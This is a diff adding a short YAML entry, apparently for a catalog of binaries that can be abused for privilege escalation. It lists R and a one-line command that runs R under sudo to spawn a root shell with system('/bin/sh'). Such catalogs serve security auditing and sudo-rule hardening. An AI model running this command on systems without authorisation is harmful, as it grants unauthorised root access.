@@ -1,0 +1,4 @@
+name: R
+binary_path: /usr/bin/R
+exploit_cmds:
+- sudo /usr/bin/R --no-save -e 'system("/bin/sh")'
